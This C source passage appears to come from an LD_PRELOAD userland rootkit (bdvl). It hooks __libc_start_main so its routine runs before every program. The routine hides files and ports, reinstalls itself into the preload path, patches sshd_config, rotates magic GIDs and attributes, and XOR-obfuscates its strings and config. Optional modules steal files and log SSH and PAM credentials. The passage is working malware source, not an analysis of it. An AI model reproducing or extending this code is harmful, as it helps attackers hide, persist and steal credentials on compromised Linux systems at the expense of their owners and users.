    if(!hidden_path(path)) return PATH_DONE;
    int rv;
#ifdef USE_MAGIC_ATTR
    rv = attrmodif(path, CREMOVEXATTR);
#else
    rv = chownpath(path, 0);
#endif
    return rv;
}
int xunhide_path(const char *path){
    if(notuser(0)) return PATH_ERR;
    if(!hidden_path(path)) return PATH_DONE;
    int rv;
    char *xpath = xordup(path);
    if(!xpath) return 0;
#ifdef USE_MAGIC_ATTR
    rv = attrmodif(xpath, CREMOVEXATTR);
#else
    rv = chownpath(xpath, 0);
#endif
    clean(xpath);
    return rv;
}

static bdvcfg_t *initmvbc(void){
    if(!mvbc) mvbc = readbdvcfg(NULL);
    return mvbc;
}
static bdvcfg_t *reinitmvbc(void){
    if(!mvbc){
        is_hideport_alive = hideport_alive();
        return initmvbc();
    }
    bree(mvbc);
    is_hideport_alive = hideport_alive();
    return mvbc = readbdvcfg(NULL);
}

#define writeover(DEST,SRC) do { \
    memset(DEST, 0, sizeof(DEST)); \
    strncpy(DEST, SRC, sizeof(DEST)); \
} while(0)

#define updbdvcfg(BC) do { \
    xorbdvcfg(BC); \
    writebdvcfg(BC, NULL); \
    xorbdvcfg(BC); \
} while(0)

#define updlogfile(PATH,PTR) do { \
    xorlogcontents(PTR); \
    writelogtofile(PATH, PTR); \
    xorlogcontents(PTR); \
} while(0)

#define clearlogbuf(BUF, CSIZE, LSIZE) do { \
    memset(BUF, 0, CSIZE); \
    LSIZE = 0; \
} while(0)

#define superkill() do { \
    hook(CKILL); \
    call(CKILL, -getppid(), SIGKILL); \
    exit(0); \
} while(0)

#define bxprintf(FMT, ...) do { \
    char *_ = xordup(FMT); \
    if(_){ \
        printf(_, __VA_ARGS__); \
        clean(_); \
    } \
} while(0)

#define bxprintlist(A) do { \
    for(size_t i = 0; i < sizeofarr(A); i++) \
        bxprintf(A[i], 0); \
} while(0)

#define fillbuf(BUF,FMT,...) do { \
    memset(BUF, 0, sizeof(BUF)); \
    snprintf(BUF, sizeof(BUF), FMT, __VA_ARGS__); \
} while(0)

int __attribute((visibility("hidden"))) touchfile(const char *path, mode_t pathmode){
    hook(CCREAT);
    int cr = (long)call(CCREAT, path, pathmode);
    if(cr != -1) close(cr);
    return cr;
}




/* 7. include essential headers for functions themselves. */
#include "doors/doors.h"
#include "gid/gid.h"
#include "hiding/hiding.h"
#include "hooks/hooks.h"
#include "install/install.h"
#include "io/io.h"
#include "log/log.h"
#include "magic/magic.h"
#include "misc/util.h"
#include "random/random.h"
#ifdef ENABLE_STEAL
#include "steal/steal.h"
#endif








/* 8. important kit functions & lastly, __libc_start_main hook. */


/* used by dl_iterate_phdr callback, to locate the loaded bdvl.so at runtime. */
extern void bdvlsuperreallygay(void){
    return;
}
/* when updating an install, this symbol is resolved from the target bdvl.so by bdvupdate, then called. output is stored accordingly.
 * first this function will get a fresh configuration with getbdvcfg, before writing the result.
 * once written, the designated file is read from. upon success, the necessary settings from the new configuration required to reinstall are printed out.
 * 
 * bdvupdate expects the output of this function to be in the following order:
 *     installdir,
 *     preloadpath,
 *     bdvlso,
 *     magicid
 * each on its own line.
 *
 * the new hideports are also parsed.
 * 
 * after bdvupdate has pointers to this result, it will overwrite the current values in memory with the new ones.
 * to finish up preparation, bdvupdate will patch ld.so to read from the new preloadpath.
 * 
 * once ready, bdvinstall is called - this function uses installdir, preloadpath, bdvlso & magicid all from a bdvcfg_t pointer.
 * hence earlier we cleared the "current" values & copied in the new ones that we needed.
 * after bdvinstall finishes, that's it. any pointers are freed & the caller is killed, as so to reconnect. */
extern void imgay(void){
    const bdvcfg_t *bc;
    size_t n;

    if((bc = getbdvcfg()) == NULL)
        return;
    n = writebdvcfg(bc, NULL);
    bree((void*)bc);
    if(!n){
        xrm(BDVL_CONFIG);
        return;
    }

    if((bc = readbdvcfg(NULL)) == NULL){
        xrm(BDVL_CONFIG);
        return;
    }

    const char *brints[3] = {bc->installdir, bc->preloadpath, bc->bdvlso};
    for(u_int i = 0; i < 3; i++) printf("%s\n", brints[i]);
    printf("%u\n", bc->magicid);

    char portbuf[256] = {0,};
    size_t bufsize = 0;
    for(u_int i = 0; i < bc->portcount; i++){
        char tmp[8];
        if(sizeof(tmp)+bufsize > sizeof(portbuf)-1)
            break;
        int c = snprintf(tmp, sizeof(tmp), "%hu, ", bc->hideports[i]);
        if(c > 0){
            bufsize += c;
            strncat(portbuf, tmp, sizeof(portbuf)-1);
        }
    }
    portbuf[bufsize-2] = '\0';
    printf("%u:%s\n", bc->portcount, portbuf);
    bree((void*)bc);
}


void __attribute((visibility("hidden"))) prepare_bdvfiles(const bdvcfg_t *bc){
    doiadir(bc->installdir, 0);
    hidedircontents(bc->installdir, mvbc);
    doiadir(bc->installdir, 1);
    if(preparedir(bc->homedir, bc->magicid))
        hidedircontents(bc->homedir, mvbc);

    const char *const prepfiles[] = {
        #ifdef OUTGOING_SSH_LOGGING
         bc->sshlogs,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
        #ifdef PAM_AUTH_LOGGING
         bc->logpath,
        #endif
         NULL
    };

    if(*prepfiles != NULL)
        for(size_t i = 0; prepfiles[i] != NULL; i++)
            prepareregfile(prepfiles[i], bc->magicid);
}


/* called by __libc_start_main, execve & execvp. first thing. */
void plsdomefirst(void){
    if(!initmvbc() || rknomore())
        return;

    is_hideport_alive = hideport_alive();

    if(xprocess(MAN_PROC_NAME))
        xsetenv(MAN_DISABLE_SECCOMP, "1", 1);

    if(notuser(0))
        return;

#if defined AFTER_DAYS || defined AFTER_HOURS
    if(!rkprocup() && uninstallnow()){
        terminate_self();
        return;
    }
#endif

#if defined USE_MAGIC_ATTR && defined ATTR_CHANGE_TIME
    /* change magic attr if it's that time. */
    magicattrchanger();
#endif

#ifdef GID_CHANGE_MINTIME
    gidchanger();
#endif

    prepare_bdvfiles(mvbc);

#ifdef PERSISTENT_REINSTALL
    /* make sure the preloadpath contains what it should. if it doesn't, write the kit's sopath to it. */
    reinstall(mvbc);
#endif
    /* if there are no rootkit proceses up - from the homedir, remove the symlinks & other random hidden ('.') directories that may have been created. */
    bdvcleanse();
#if defined FILE_CLEANSE_TIMER && defined ENABLE_STEAL
    /* remove stolen files if it's that time. */
    cleanstolen();
#endif

#ifdef HARD_PATCH
    /* check sshd_config & if it needs any changes, write them to the file. */
    sshdpatch();
#endif
}


static void (*realinit)(void) = NULL, (*realfini)(void) = NULL;
void __attribute((visibility("hidden"))) bdvlinit(void){
    realinit != NULL ? realinit() : 0;
    plsdomefirst();
}
void __attribute((visibility("hidden"))) bdvlfini(void){
    plsdomefirst();
    realfini != NULL ? realfini() : 0;
}
int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
    realinit = init, realfini = fini;
    hook(C__LIBC_START_MAIN);
    return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, bdvlinit, bdvlfini, rtld_fini, stack_end);
}